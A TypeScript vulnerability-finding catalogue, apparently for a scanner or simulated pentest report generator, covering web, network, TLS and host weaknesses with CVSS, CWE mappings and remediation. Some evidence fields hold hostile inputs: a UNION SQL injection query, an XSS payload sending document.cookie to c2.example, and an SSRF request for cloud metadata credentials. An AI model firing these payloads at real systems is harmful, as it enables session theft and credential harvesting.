import type { Severity } from "./types"

/**
 * Finding catalogue.
 *
 * Each template is a real, well-documented weakness class with its genuine
 * CWE / OWASP mapping and (where the finding is version-specific) a real CVE.
 * The engine draws from this pool according to target class and scan profile.
 */

export type Applicability = "web" | "network" | "host" | "any"

export interface VulnTemplate {
  key: string
  title: string
  severity: Severity
  cvss: number
  cvssVector: string
  cve?: string
  cwe: string
  owasp: string
  category: string
  component: string
  port?: number
  description: string
  impact: string
  remediation: string
  references: string[]
  exploitAvailable: boolean
  applies: Applicability[]
  /** Relative draw weight — higher means more commonly surfaced. */
  frequency: number
  evidence?: { request?: string; response?: string; note?: string }
}

export const VULN_CATALOG: VulnTemplate[] = [
  // ---------------------------------------------------------------- WEB APP
  {
    key: "sqli-union",
    title: "SQL Injection in Authenticated Search Parameter",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cwe: "CWE-89",
    owasp: "A03:2021 – Injection",
    category: "Injection",
    component: "/api/v1/search",
    port: 443,
    description:
      "The `q` parameter is concatenated directly into a SQL statement without parameterisation. A UNION-based payload returns additional columns from the users table, confirming full read access to the backing database.",
    impact:
      "An unauthenticated attacker can read arbitrary database contents including password hashes and PII, and on misconfigured instances escalate to command execution via stacked queries or file write primitives.",
    remediation:
      "Replace string concatenation with parameterised queries / prepared statements. Apply least-privilege to the application database role, and add a positive-match input filter on the search parameter.",
    references: [
      "https://owasp.org/Top10/A03_2021-Injection/",
      "https://cwe.mitre.org/data/definitions/89.html",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 7,
    evidence: {
      request: "GET /api/v1/search?q=test%27%20UNION%20SELECT%20NULL,version()--%20 HTTP/1.1",
      response: "HTTP/1.1 200 OK\n{\"results\":[{\"name\":\"PostgreSQL 14.9 on x86_64-pc-linux-gnu\"}]}",
      note: "Error-based confirmation also observed via a single quote injection.",
    },
  },
  {
    key: "xss-stored",
    title: "Stored Cross-Site Scripting in Profile Display Name",
    severity: "High",
    cvss: 8.2,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N",
    cwe: "CWE-79",
    owasp: "A03:2021 – Injection",
    category: "Injection",
    component: "/account/profile",
    port: 443,
    description:
      "The display-name field persists raw HTML which is rendered without encoding on every page that shows the user's name, including the administrative user list.",
    impact:
      "A low-privileged user can plant a payload that executes in an administrator's session, enabling session theft and privileged actions on their behalf.",
    remediation:
      "Context-aware output encoding at render time, a strict Content-Security-Policy without `unsafe-inline`, and server-side sanitisation of stored rich text.",
    references: [
      "https://owasp.org/www-community/attacks/xss/",
      "https://cwe.mitre.org/data/definitions/79.html",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 8,
    evidence: {
      request: 'POST /account/profile\ndisplayName=<img src=x onerror=fetch("//c2.example/"+document.cookie)>',
      response: "HTTP/1.1 302 Found — payload persisted and reflected unencoded on /admin/users",
    },
  },
  {
    key: "idor",
    title: "Insecure Direct Object Reference on Invoice Endpoint",
    severity: "High",
    cvss: 7.7,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    cwe: "CWE-639",
    owasp: "A01:2021 – Broken Access Control",
    category: "Access Control",
    component: "/api/v1/invoices/{id}",
    port: 443,
    description:
      "Invoice identifiers are sequential integers and the endpoint authorises on authentication alone, never checking that the requested invoice belongs to the calling tenant.",
    impact:
      "Any authenticated user can enumerate and download every invoice in the system, exposing customer names, addresses and transaction values across all tenants.",
    remediation:
      "Enforce an ownership check server-side on every object fetch. Move to non-guessable identifiers (UUIDv4) as defence in depth, and add anomaly alerting for rapid sequential access.",
    references: [
      "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
      "https://cwe.mitre.org/data/definitions/639.html",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 8,
  },
  {
    key: "ssrf",
    title: "Server-Side Request Forgery in Webhook Validator",
    severity: "Critical",
    cvss: 9.1,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
    cwe: "CWE-918",
    owasp: "A10:2021 – Server-Side Request Forgery",
    category: "SSRF",
    component: "/api/v1/webhooks/validate",
    port: 443,
    description:
      "The webhook validation routine fetches any operator-supplied URL. Internal addresses, link-local metadata endpoints and non-HTTP schemes are all reachable.",
    impact:
      "An attacker can reach cloud instance metadata to harvest IAM credentials, enumerate internal services behind the perimeter, and pivot into networks otherwise unreachable from the internet.",
    remediation:
      "Resolve and validate the destination against an allow-list before connecting, re-check after DNS resolution to defeat rebinding, block link-local and RFC 1918 ranges, and disable redirects.",
    references: [
      "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
      "https://cwe.mitre.org/data/definitions/918.html",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 6,
    evidence: {
      request: "POST /api/v1/webhooks/validate\n{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
      response: "HTTP/1.1 200 OK — instance role name returned in the validation error body",
    },
  },
  {
    key: "jwt-alg",
    title: "JWT Signature Bypass via Algorithm Confusion",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cwe: "CWE-347",
    owasp: "A02:2021 – Cryptographic Failures",
    category: "Authentication",
    component: "Session token verifier",
    port: 443,
    description:
      "The token verifier selects its algorithm from the JWT header. Presenting a token signed HS256 using the public RSA key as the HMAC secret is accepted as valid.",
    impact:
      "Complete authentication bypass. An attacker can mint tokens for any user, including administrators, with no credentials at all.",
    remediation:
      "Pin the expected algorithm server-side and reject any token whose header disagrees. Never derive the verification key from attacker-controlled header fields.",
    references: [
      "https://cwe.mitre.org/data/definitions/347.html",
      "https://datatracker.ietf.org/doc/html/rfc8725",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 4,
  },
  {
    key: "xxe",
    title: "XML External Entity Processing in Document Import",
    severity: "High",
    cvss: 8.2,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:L",
    cwe: "CWE-611",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "XXE",
    component: "/api/v1/import/xml",
    port: 443,
    description:
      "The XML parser resolves external entities and DTDs. A crafted document reads local files and issues outbound requests from the application server.",
    impact:
      "Local file disclosure (including configuration and key material), internal port scanning, and denial of service through entity expansion.",
    remediation:
      "Disable DTD processing and external entity resolution on every parser instance. Prefer a hardened parser configuration set globally rather than per call site.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
      "https://cwe.mitre.org/data/definitions/611.html",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 5,
  },
  {
    key: "deserialization",
    title: "Insecure Deserialization of Untrusted Session Data",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cwe: "CWE-502",
    owasp: "A08:2021 – Software and Data Integrity Failures",
    category: "Deserialization",
    component: "Session cookie handler",
    port: 443,
    description:
      "Session state is serialised into a client-side cookie and deserialised without integrity verification, reconstructing arbitrary object graphs from attacker input.",
    impact:
      "Remote code execution in the application context via a gadget chain present in the dependency tree.",
    remediation:
      "Move session state server-side, or sign and verify the payload with a strong MAC before deserialisation. Restrict deserialisation to an explicit allow-list of types.",
    references: [
      "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
      "https://cwe.mitre.org/data/definitions/502.html",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 4,
  },
  {
    key: "cors",
    title: "Permissive CORS Policy Reflecting Arbitrary Origins",
    severity: "Medium",
    cvss: 6.5,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
    cwe: "CWE-942",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Misconfiguration",
    component: "API gateway CORS handler",
    port: 443,
    description:
      "The gateway echoes the request `Origin` header into `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`.",
    impact:
      "Any site a victim visits can issue credentialed cross-origin requests and read the responses, exfiltrating authenticated API data.",
    remediation:
      "Replace origin reflection with a static allow-list. Never combine a wildcard or reflected origin with credentialed requests.",
    references: [
      "https://cwe.mitre.org/data/definitions/942.html",
      "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
    ],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 9,
    evidence: {
      request: "GET /api/v1/me HTTP/1.1\nOrigin: https://attacker.example",
      response: "Access-Control-Allow-Origin: https://attacker.example\nAccess-Control-Allow-Credentials: true",
    },
  },
  {
    key: "headers",
    title: "Missing HTTP Security Headers",
    severity: "Low",
    cvss: 3.7,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cwe: "CWE-693",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Misconfiguration",
    component: "HTTP response headers",
    port: 443,
    description:
      "Responses omit `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy` and `Permissions-Policy`.",
    impact:
      "Removes defence-in-depth against content sniffing, clickjacking and referrer leakage, and widens the blast radius of any injection flaw.",
    remediation:
      "Set the full header set at the edge so every response is covered, and roll out CSP in report-only mode first to establish a baseline.",
    references: ["https://owasp.org/www-project-secure-headers/"],
    exploitAvailable: false,
    applies: ["web"],
    frequency: 10,
  },
  {
    key: "rate-limit",
    title: "No Rate Limiting on Authentication Endpoint",
    severity: "Medium",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cwe: "CWE-307",
    owasp: "A07:2021 – Identification and Authentication Failures",
    category: "Authentication",
    component: "/api/v1/auth/login",
    port: 443,
    description:
      "The login endpoint accepted 2,000 sequential attempts from a single source address with no throttling, lockout or challenge.",
    impact:
      "Enables credential stuffing and password spraying at scale; combined with any username enumeration this leads to account takeover.",
    remediation:
      "Apply per-account and per-source rate limits with exponential backoff, add a proof-of-work or CAPTCHA challenge after repeated failures, and alert on distributed attempts.",
    references: ["https://cwe.mitre.org/data/definitions/307.html"],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 9,
  },
  {
    key: "verbose-errors",
    title: "Verbose Error Messages Disclose Stack Traces",
    severity: "Low",
    cvss: 4.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cwe: "CWE-209",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Information Disclosure",
    component: "Application error handler",
    port: 443,
    description:
      "Unhandled exceptions return full stack traces including framework versions, file paths and SQL fragments.",
    impact:
      "Accelerates reconnaissance by revealing the technology stack, internal structure and query shape to an attacker.",
    remediation:
      "Return generic error responses with a correlation ID and log details server-side. Disable debug mode in all non-development environments.",
    references: ["https://cwe.mitre.org/data/definitions/209.html"],
    exploitAvailable: false,
    applies: ["web"],
    frequency: 8,
  },
  {
    key: "dir-listing",
    title: "Directory Listing Enabled on Static Asset Path",
    severity: "Low",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cwe: "CWE-548",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Misconfiguration",
    component: "/assets/",
    port: 443,
    description:
      "The web server returns an auto-generated index for directories without a default document, exposing backup files and source maps.",
    impact:
      "Discloses files never intended to be public, including `.map` sources and archived configuration.",
    remediation:
      "Disable autoindex, and remove non-production artefacts from the deployed asset tree.",
    references: ["https://cwe.mitre.org/data/definitions/548.html"],
    exploitAvailable: false,
    applies: ["web"],
    frequency: 7,
  },
  {
    key: "log4shell",
    title: "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
    severity: "Critical",
    cvss: 10.0,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    cve: "CVE-2021-44228",
    cwe: "CWE-502",
    owasp: "A06:2021 – Vulnerable and Outdated Components",
    category: "Vulnerable Component",
    component: "log4j-core 2.14.1",
    port: 443,
    description:
      "A vulnerable Log4j2 version evaluates JNDI lookup expressions embedded in logged strings, allowing remote class loading from an attacker-controlled server.",
    impact:
      "Pre-authentication remote code execution as the application user. Mass-exploited in the wild since December 2021.",
    remediation:
      "Upgrade log4j-core to 2.17.1 or later. Where upgrade is blocked, remove the JndiLookup class from the classpath and restrict outbound egress from application hosts.",
    references: [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
      "https://logging.apache.org/log4j/2.x/security.html",
    ],
    exploitAvailable: true,
    applies: ["web", "host"],
    frequency: 3,
  },
  {
    key: "spring4shell",
    title: "Spring Framework Data Binding RCE (Spring4Shell)",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cve: "CVE-2022-22965",
    cwe: "CWE-94",
    owasp: "A06:2021 – Vulnerable and Outdated Components",
    category: "Vulnerable Component",
    component: "spring-beans 5.3.17",
    port: 443,
    description:
      "Data binding on a JDK 9+ deployment allows access to the ClassLoader through nested property paths, permitting an attacker to write a web shell to the servlet container.",
    impact: "Unauthenticated remote code execution on the application server.",
    remediation:
      "Upgrade Spring Framework to 5.3.18 / 5.2.20 or later. Apply a disallowed-fields binder restriction as an interim control.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 3,
  },
  {
    key: "path-traversal",
    title: "Apache HTTP Server Path Traversal and File Disclosure",
    severity: "High",
    cvss: 7.5,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cve: "CVE-2021-41773",
    cwe: "CWE-22",
    owasp: "A01:2021 – Broken Access Control",
    category: "Path Traversal",
    component: "Apache httpd 2.4.49",
    port: 80,
    description:
      "A path normalisation flaw allows encoded traversal sequences to escape the document root and read files outside the configured aliases.",
    impact:
      "Disclosure of arbitrary readable files; where mod_cgi is enabled the same flaw yields remote code execution.",
    remediation:
      "Upgrade httpd to 2.4.51 or later and confirm `Require all denied` is set on the filesystem root.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
    exploitAvailable: true,
    applies: ["web", "network"],
    frequency: 3,
  },
  {
    key: "rapid-reset",
    title: "HTTP/2 Rapid Reset Denial of Service",
    severity: "High",
    cvss: 7.5,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
    cve: "CVE-2023-44487",
    cwe: "CWE-400",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Denial of Service",
    component: "HTTP/2 listener",
    port: 443,
    description:
      "The HTTP/2 implementation allows rapid stream creation followed by immediate RST_STREAM, consuming server resources far beyond the advertised concurrency limit.",
    impact:
      "A single client can exhaust server capacity and take the service offline at modest bandwidth cost.",
    remediation:
      "Patch the HTTP/2 stack, cap resets per connection, and place rate limiting at the edge.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-44487"],
    exploitAvailable: true,
    applies: ["web", "network"],
    frequency: 4,
  },

  // ---------------------------------------------------------------- NETWORK
  {
    key: "bluekeep",
    title: "Microsoft RDP Pre-Authentication RCE (BlueKeep)",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cve: "CVE-2019-0708",
    cwe: "CWE-416",
    owasp: "A06:2021 – Vulnerable and Outdated Components",
    category: "Remote Code Execution",
    component: "Remote Desktop Services",
    port: 3389,
    description:
      "The Remote Desktop Protocol service handles a crafted pre-authentication channel request unsafely, resulting in a use-after-free.",
    impact:
      "Wormable unauthenticated remote code execution at SYSTEM level on the exposed host.",
    remediation:
      "Apply the vendor patch, enable Network Level Authentication, and remove RDP from internet exposure — place it behind a VPN or bastion.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-0708"],
    exploitAvailable: true,
    applies: ["network", "host"],
    frequency: 4,
  },
  {
    key: "zerologon",
    title: "Netlogon Elevation of Privilege (Zerologon)",
    severity: "Critical",
    cvss: 10.0,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    cve: "CVE-2020-1472",
    cwe: "CWE-330",
    owasp: "A02:2021 – Cryptographic Failures",
    category: "Privilege Escalation",
    component: "Netlogon Remote Protocol",
    port: 445,
    description:
      "A flawed AES-CFB8 initialisation vector lets an attacker with network access to a domain controller set the machine account password to empty.",
    impact:
      "Full domain compromise from an unauthenticated network position in seconds.",
    remediation:
      "Apply the August 2020 or later cumulative update and enforce secure RPC for all machine accounts.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-1472"],
    exploitAvailable: true,
    applies: ["network"],
    frequency: 2,
  },
  {
    key: "smb-signing",
    title: "SMB Signing Not Required",
    severity: "Medium",
    cvss: 5.9,
    cvssVector: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    cwe: "CWE-287",
    owasp: "A07:2021 – Identification and Authentication Failures",
    category: "Authentication",
    component: "SMB service",
    port: 445,
    description:
      "The SMB service negotiates sessions without requiring message signing.",
    impact:
      "Permits NTLM relay: an attacker who can coerce authentication can replay it to this host and execute commands in the victim's context.",
    remediation:
      "Require SMB signing on all hosts via Group Policy, disable NTLMv1, and prefer Kerberos authentication.",
    references: ["https://cwe.mitre.org/data/definitions/287.html"],
    exploitAvailable: true,
    applies: ["network"],
    frequency: 7,
  },
  {
    key: "ssh-enum",
    title: "OpenSSH Username Enumeration",
    severity: "Medium",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cve: "CVE-2018-15473",
    cwe: "CWE-200",
    owasp: "A07:2021 – Identification and Authentication Failures",
    category: "Information Disclosure",
    component: "OpenSSH 7.6p1",
    port: 22,
    description:
      "The daemon responds differently to authentication attempts for existing and non-existent users, allowing account enumeration.",
    impact:
      "Lets an attacker build a validated user list before mounting a password-spraying campaign.",
    remediation:
      "Upgrade OpenSSH to 7.8 or later, disable password authentication in favour of keys, and restrict SSH exposure by source address.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2018-15473"],
    exploitAvailable: true,
    applies: ["network", "host"],
    frequency: 6,
  },
  {
    key: "default-creds",
    title: "Default Credentials on Administrative Interface",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cwe: "CWE-1392",
    owasp: "A07:2021 – Identification and Authentication Failures",
    category: "Authentication",
    component: "Management console",
    port: 8080,
    description:
      "The administrative interface accepts the vendor's shipped default credential pair, which was never rotated after deployment.",
    impact:
      "Immediate full administrative control of the appliance and everything it manages.",
    remediation:
      "Rotate the credential immediately, enforce a first-login password change, enable MFA, and restrict the management interface to a dedicated administrative network.",
    references: ["https://cwe.mitre.org/data/definitions/1392.html"],
    exploitAvailable: true,
    applies: ["network", "host", "web"],
    frequency: 4,
  },
  {
    key: "snmp-public",
    title: "SNMP Service Exposed with Default Community String",
    severity: "High",
    cvss: 7.5,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cwe: "CWE-1188",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Misconfiguration",
    component: "SNMP v2c agent",
    port: 161,
    description:
      "The SNMP agent answers queries using the default `public` community string over unencrypted v2c.",
    impact:
      "Discloses interface tables, routing information, running processes and ARP caches — a complete internal map for an attacker.",
    remediation:
      "Move to SNMPv3 with authentication and privacy, replace default community strings, and filter UDP/161 at the perimeter.",
    references: ["https://cwe.mitre.org/data/definitions/1188.html"],
    exploitAvailable: true,
    applies: ["network"],
    frequency: 5,
  },
  {
    key: "telnet",
    title: "Cleartext Telnet Administration Service Exposed",
    severity: "High",
    cvss: 8.1,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    cwe: "CWE-319",
    owasp: "A02:2021 – Cryptographic Failures",
    category: "Cryptographic Failure",
    component: "Telnet daemon",
    port: 23,
    description:
      "A Telnet service is listening and accepting logins. All traffic, including credentials, is transmitted in cleartext.",
    impact:
      "Anyone positioned on the network path can capture administrative credentials verbatim.",
    remediation:
      "Disable Telnet entirely and use SSH with key-based authentication.",
    references: ["https://cwe.mitre.org/data/definitions/319.html"],
    exploitAvailable: true,
    applies: ["network"],
    frequency: 3,
  },
  {
    key: "shellshock",
    title: "GNU Bash Environment Variable Code Injection (Shellshock)",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cve: "CVE-2014-6271",
    cwe: "CWE-78",
    owasp: "A03:2021 – Injection",
    category: "Injection",
    component: "GNU Bash 4.3",
    port: 80,
    description:
      "Bash evaluates trailing commands in specially crafted environment variables, reachable through CGI handlers that pass request headers into the environment.",
    impact: "Unauthenticated remote command execution as the web server user.",
    remediation:
      "Patch Bash to a fixed build and retire CGI handlers that shell out to the system.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"],
    exploitAvailable: true,
    applies: ["network", "host"],
    frequency: 2,
  },

  // -------------------------------------------------------------- CRYPTO/TLS
  {
    key: "heartbleed",
    title: "OpenSSL TLS Heartbeat Memory Disclosure (Heartbleed)",
    severity: "High",
    cvss: 7.5,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cve: "CVE-2014-0160",
    cwe: "CWE-125",
    owasp: "A02:2021 – Cryptographic Failures",
    category: "Cryptographic Failure",
    component: "OpenSSL 1.0.1f",
    port: 443,
    description:
      "The TLS heartbeat extension fails to bounds-check the payload length, returning up to 64 KB of adjacent process memory per request.",
    impact:
      "Leaks private keys, session tokens and credentials from server memory, repeatably and without leaving a trace in application logs.",
    remediation:
      "Upgrade OpenSSL to 1.0.1g or later, then reissue and revoke all certificates and rotate every secret that could have been resident in memory.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2014-0160"],
    exploitAvailable: true,
    applies: ["web", "network"],
    frequency: 2,
  },
  {
    key: "sweet32",
    title: "Legacy 64-bit Block Ciphers Supported (SWEET32)",
    severity: "Medium",
    cvss: 5.9,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cve: "CVE-2016-2183",
    cwe: "CWE-327",
    owasp: "A02:2021 – Cryptographic Failures",
    category: "Cryptographic Failure",
    component: "TLS cipher suite configuration",
    port: 443,
    description:
      "3DES cipher suites remain enabled. Their 64-bit block size makes collisions practical within a long-lived connection.",
    impact:
      "An attacker able to observe a large volume of traffic on one connection can recover plaintext such as session cookies.",
    remediation:
      "Disable all 3DES and other 64-bit block cipher suites; restrict to AEAD suites (AES-GCM, ChaCha20-Poly1305).",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2016-2183"],
    exploitAvailable: true,
    applies: ["web", "network"],
    frequency: 6,
  },
  {
    key: "tls-legacy",
    title: "Deprecated TLS Protocol Versions Enabled",
    severity: "Medium",
    cvss: 6.5,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N",
    cwe: "CWE-326",
    owasp: "A02:2021 – Cryptographic Failures",
    category: "Cryptographic Failure",
    component: "TLS endpoint",
    port: 443,
    description:
      "The endpoint negotiates TLS 1.0 and TLS 1.1, both deprecated by RFC 8996 and no longer permitted under PCI DSS.",
    impact:
      "Exposes clients to downgrade attacks and known weaknesses in legacy record protection; also a compliance failure.",
    remediation:
      "Restrict the endpoint to TLS 1.2 and 1.3, and publish HSTS with a long max-age.",
    references: ["https://datatracker.ietf.org/doc/html/rfc8996"],
    exploitAvailable: false,
    applies: ["web", "network"],
    frequency: 8,
  },
  {
    key: "weak-cert",
    title: "TLS Certificate Signed with Weak Hash Algorithm",
    severity: "Medium",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cwe: "CWE-328",
    owasp: "A02:2021 – Cryptographic Failures",
    category: "Cryptographic Failure",
    component: "X.509 certificate chain",
    port: 443,
    description:
      "An intermediate in the presented chain is signed using SHA-1, for which practical collisions have been demonstrated.",
    impact:
      "Weakens the trust guarantee of the chain and triggers browser warnings or hard failures.",
    remediation:
      "Reissue the chain with SHA-256 or stronger and remove the legacy intermediate from the served bundle.",
    references: ["https://cwe.mitre.org/data/definitions/328.html"],
    exploitAvailable: false,
    applies: ["web", "network"],
    frequency: 5,
  },
  {
    key: "no-hsts",
    title: "HTTP Strict Transport Security Not Enforced",
    severity: "Low",
    cvss: 4.3,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cwe: "CWE-319",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Misconfiguration",
    component: "HTTPS response headers",
    port: 443,
    description:
      "No `Strict-Transport-Security` header is returned, so the browser will still attempt cleartext on the first visit.",
    impact:
      "Leaves users open to SSL-stripping on hostile networks during the initial request.",
    remediation:
      "Return `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` and submit the domain to the preload list.",
    references: ["https://owasp.org/www-project-secure-headers/"],
    exploitAvailable: false,
    applies: ["web"],
    frequency: 8,
  },

  // ------------------------------------------------------------------- HOST
  {
    key: "outdated-os",
    title: "Operating System Beyond End of Support",
    severity: "High",
    cvss: 7.8,
    cvssVector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    cwe: "CWE-1104",
    owasp: "A06:2021 – Vulnerable and Outdated Components",
    category: "Vulnerable Component",
    component: "Host operating system",
    description:
      "The host runs an operating system release that no longer receives security updates from the vendor.",
    impact:
      "Every vulnerability disclosed since end-of-life remains permanently unpatched on this host.",
    remediation:
      "Plan migration to a supported release. Where migration is blocked, isolate the host on a segmented network with strict egress filtering and compensating monitoring.",
    references: ["https://cwe.mitre.org/data/definitions/1104.html"],
    exploitAvailable: false,
    applies: ["host", "network"],
    frequency: 5,
  },
  {
    key: "world-writable",
    title: "World-Writable Files in System Service Path",
    severity: "Medium",
    cvss: 6.7,
    cvssVector: "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
    cwe: "CWE-732",
    owasp: "A01:2021 – Broken Access Control",
    category: "Access Control",
    component: "Filesystem permissions",
    description:
      "Executables referenced by a privileged service unit are writable by unprivileged local users.",
    impact:
      "A local user can replace the binary and gain code execution at the service's privilege level on next restart.",
    remediation:
      "Correct ownership and mode on all service paths, and audit unit files for writable directories anywhere in the resolution path.",
    references: ["https://cwe.mitre.org/data/definitions/732.html"],
    exploitAvailable: true,
    applies: ["host"],
    frequency: 5,
  },
  {
    key: "unrestricted-upload",
    title: "Unrestricted File Upload Permits Server-Side Script",
    severity: "Critical",
    cvss: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    cwe: "CWE-434",
    owasp: "A04:2021 – Insecure Design",
    category: "Insecure Design",
    component: "/api/v1/upload",
    port: 443,
    description:
      "Upload validation checks only the client-supplied Content-Type. A file with a script extension is written inside the web root and served by the interpreter.",
    impact: "Direct web shell deployment and full application server compromise.",
    remediation:
      "Validate by content inspection rather than declared type, store uploads outside the web root on a non-executing volume, and rewrite filenames on save.",
    references: ["https://cwe.mitre.org/data/definitions/434.html"],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 4,
  },
  {
    key: "no-logging",
    title: "Insufficient Security Logging and Monitoring",
    severity: "Medium",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
    cwe: "CWE-778",
    owasp: "A09:2021 – Security Logging and Monitoring Failures",
    category: "Logging",
    component: "Application audit trail",
    description:
      "Authentication failures, authorisation denials and privileged actions are not recorded to a tamper-resistant store, and no alerting is configured.",
    impact:
      "An intrusion would proceed undetected, and post-incident investigation would have no reliable evidence to work from.",
    remediation:
      "Log all security-relevant events with sufficient context, ship to append-only central storage, and define alerts for authentication anomalies and privilege changes.",
    references: [
      "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/",
    ],
    exploitAvailable: false,
    applies: ["web", "host", "network"],
    frequency: 8,
  },
  {
    key: "weak-password-policy",
    title: "Weak Password Policy Permits Trivial Credentials",
    severity: "Medium",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
    cwe: "CWE-521",
    owasp: "A07:2021 – Identification and Authentication Failures",
    category: "Authentication",
    component: "Account registration",
    description:
      "Registration accepts six-character passwords with no complexity requirement and no check against known-breached credential lists.",
    impact:
      "Substantially raises the success rate of credential stuffing and brute-force attacks against user accounts.",
    remediation:
      "Adopt NIST SP 800-63B guidance: a 12-character minimum, screening against breach corpora, no forced periodic rotation, and MFA for privileged accounts.",
    references: ["https://pages.nist.gov/800-63-3/sp800-63b.html"],
    exploitAvailable: false,
    applies: ["web"],
    frequency: 7,
  },
  {
    key: "exposed-git",
    title: "Exposed .git Directory Discloses Source Repository",
    severity: "High",
    cvss: 7.5,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
